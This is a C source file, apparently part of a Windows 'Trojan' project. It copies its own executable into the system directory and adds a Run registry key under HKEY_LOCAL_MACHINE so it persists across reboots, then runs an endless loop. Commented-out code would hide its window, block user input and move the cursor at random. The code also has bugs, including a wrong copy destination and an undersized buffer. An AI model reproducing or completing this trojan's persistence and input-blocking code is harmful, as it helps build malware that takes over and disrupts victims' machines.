#include "Trojan.h"
#include "Injector.h"

#include <tchar.h> // _tprintf

PTCHAR GetFilename(const PTCHAR filepath, size_t length)
{
	size_t i = strlen(filepath) - 1;
	for (; i != 0 && filepath[i] != '\\' && filepath[i] != '/'; --i);

	size_t filename_length = 0;
	while (filepath[i++] != '\0')
		filename_length++;

	PTCHAR filename = (PTCHAR)malloc(filename_length);
	if (!filename)
	{
		_tprintf(TEXT("Cannot allocate memory for filename.\n"));

		return NULL;
	}
	memcpy(filename, filepath + i - filename_length, filename_length);

	return filename;
}

BOOL InitTrojan()
{
	TCHAR filepath[SMALL_BUFFER_LENGTH];
	if(!GetModuleFileName(GetModuleHandle(NULL), filepath, SMALL_BUFFER_LENGTH))
	{
		PrintError(TEXT("GetModuleFileName"));

		return FALSE;
	}

	TCHAR sysdir[SMALL_BUFFER_LENGTH];
	if(!GetSystemDirectory(sysdir, SMALL_BUFFER_LENGTH))
	{
		PrintError(TEXT("GetSystemDirectory"));

		return FALSE;
	}

	if (!CopyFile(filepath, sysdir, TRUE))
	{
		PrintError(TEXT("CopyFile"));

		return FALSE;
	}

	PTCHAR filename = GetFilename(filepath, SMALL_BUFFER_LENGTH);
	if (!filename)
	{
		printf("Cannot get filename.\n");

		return FALSE;
	}

	HKEY hKey;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0ul, KEY_WRITE, &hKey) != ERROR_SUCCESS)
	{
		PrintError(TEXT("RegOpenKeyEx"));

		free(filename);

		return FALSE;
	}

	if (RegSetValueEx(hKey, filename, 0ul, REG_EXPAND_SZ, (BYTE*)sysdir, SMALL_BUFFER_LENGTH) != ERROR_SUCCESS)
	{
		PrintError(TEXT("RegSetValueEx"));
		if (RegCloseKey(hKey) != ERROR_SUCCESS)
			PrintError(TEXT("RegCloseKey"));

		free(filename);

		return FALSE;
	}

	if (RegCloseKey(hKey) != ERROR_SUCCESS)
	{
		PrintError(TEXT("RegCloseKey"));
		
		free(filename);

		return FALSE;
	}

	free(filename);

	return TRUE;
}

VOID StartTrojan()
{
	InitTrojan();
	// FreeConsole();
	// ShowWindow(GetForegroundWindow(), SW_HIDE);

	// int width  = GetDeviceCaps(GetDC(NULL), HORZRES),
	// 	   height = GetDeviceCaps(GetDC(NULL), VERTRES);

	while (TRUE)
	{
		// BlockInput(TRUE);
		// SetCursorPos(rand() % width, rand() % height);
		// Beep();
	}
}

